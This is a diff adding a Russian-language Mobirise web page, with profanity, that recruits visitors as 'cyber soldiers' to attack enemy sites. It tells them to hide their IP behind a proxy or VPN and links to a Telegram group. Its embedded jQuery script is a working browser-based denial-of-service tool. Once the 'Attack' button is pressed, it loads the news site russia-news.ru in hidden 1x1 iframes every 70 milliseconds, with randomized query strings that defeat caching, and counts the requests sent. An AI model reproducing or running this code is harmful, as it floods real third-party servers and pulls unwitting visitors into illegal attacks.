@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html  >
+<head>
+  <!-- Site made with Mobirise Website Builder v5.6.3, https://mobirise.com -->
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="generator" content="Mobirise v5.6.3, mobirise.com">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
+  <link rel="shortcut icon" href="assets/images/bomb-microsoft-128x128.png" type="image/x-icon">
+  <meta name="description" content="">
+  
+  
+  <title>Киберпиздец</title>
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-grid.min.css">
+  <link rel="stylesheet" href="assets/bootstrap/css/bootstrap-reboot.min.css">
+  <link rel="stylesheet" href="assets/socicon/css/styles.css">
+  <link rel="stylesheet" href="assets/theme/css/style.css">
+  <link rel="preload" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Jost:100,200,300,400,500,600,700,800,900,100i,200i,300i,400i,500i,600i,700i,800i,900i&display=swap"></noscript>
+  <link rel="preload" as="style" href="assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="assets/mobirise/css/mbr-additional.css" type="text/css">
+  
+  
+  
+  
+</head>
+<body>
+  
+  <section data-bs-version="5.1" class="header6 cid-sZc2Gn8ibI mbr-fullscreen" id="header6-1">
+
+    
+
+    <div class="mbr-overlay" style="opacity: 0.3; background-color: rgb(68, 121, 217);"></div>
+
+    <div class="align-center container">
+        <div class="row justify-content-center">
+            <div class="col-12 col-lg-10">
+                <h1 class="mbr-section-title mbr-fonts-style mbr-white mb-3 display-1"><strong>КИБЕРПИЗДЕЦ💣</strong></h1>
+                <h2 class="mbr-section-subtitle mbr-fonts-style mbr-white mb-3 display-2">Привет киберсолдат!</h2>
+                <p class="mbr-text mbr-white mbr-fonts-style display-7">
+                    Этот сайт настоящее кибер-оружие. <br>Нажимай кнопку <strong>«Атаковать»</strong> и сервер киберпиздеца начнет атаковать сайты врага с твоего компа/телефона и других таких же киберсолдат.<br><br>Обязательно используй Proxy / VPN для подмены своего IP-адреса.<br>Все дополнительные инструкции будут предоставлены позже.<br><br>Русский корабль, иди нахуй!<br>💛💙<br></p>
+
+
+
+
+    <div class="row justify-content-center">
+        <div class="col-6">
+            <button id="start" class= "btn btn-success text-center">
+                АТАКОВАТЬ
+            </button>
+            <div>
+                <p>Количество отправленных запросов: <b id="counter">0</b></p>
+            </div>
+        </div>
+          <p>
+            </div>
+        </div>
+    </div>
+</section>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script>
+        let inProgress = false;
+        let interval;
+        let iframeIndex = 1;
+        let count = 0;
+
+        const TARGET = 'https://russia-news.ru/';
+
+        function getRandomArbitrary(min, max) {
+            return Math.random() * (max - min) + min;
+        }
+
+        function generateRandomSalt() {
+            const now = (new Date()).getTime();
+            return '?' + now + getRandomArbitrary(0, 100000);
+        }
+
+        function getTarget() {
+            const salt = generateRandomSalt();
+
+            return TARGET + salt;
+        }
+
+        function drawIframe(block, target, id) {
+            $('<iframe>', {
+                src: target,
+                id: 'frame' + id,
+                frameborder: 0,
+                width: 1,
+                height: 1,
+            }).appendTo(block);
+        }
+
+        function start() {
+            const frameBlock = $('#frames');
+
+            interval = setInterval(() => {
+                const target = getTarget();
+                console.log(target);
+                drawIframe(frameBlock, target, iframeIndex);
+                iframeIndex++;
+                count++;
+                if (iframeIndex > 200) {
+                    clearFrames();
+                    iframeIndex = 1;
+                }
+            }, 70);
+        }
+
+        function clearFrames() {
+            $('#frames').empty();
+        }
+
+        function stop() {
+            clearInterval(interval);
+            clearFrames();
+        }
+
+        $(document).ready(function () {
+            const counterBlock = $('#counter');
+            setInterval(() => {
+                counterBlock.text(count);
+            }, 1000)
+            $('#start')
+                .on('click', function (e) {
+                    e.preventDefault();
+                    inProgress = !inProgress;
+                    $(this).text((inProgress) ? 'АТАКОВАТЬ' : 'СТОП');
+                    if (inProgress) {
+                        start();
+                    } else {
+                        stop();
+                    }
+                })
+        });
+    </script>
+
+
+<section data-bs-version="5.1" class="info1 cid-sZdg0VSo5C" id="info1-2">
+    
+    
+    <div class="align-center container">
+        <div class="row justify-content-center">
+            <div class="col-12 col-lg-8">
+                <h3 class="mbr-section-title mb-4 mbr-fonts-style display-1">
+                    <strong>Вступай в ряды Киберсолдат</strong></h3>
+                
+                <div class="mbr-section-btn"><a class="btn btn-white display-4" href="https://t.me/+JJ52cqA3HhIxNzhi"><span class="socicon socicon-telegram mbr-iconfont mbr-iconfont-btn"></span>Вступить</a></div>
+            </div>
+        </div>
+    </div>
+
+  
+  
+</body>
+</html>
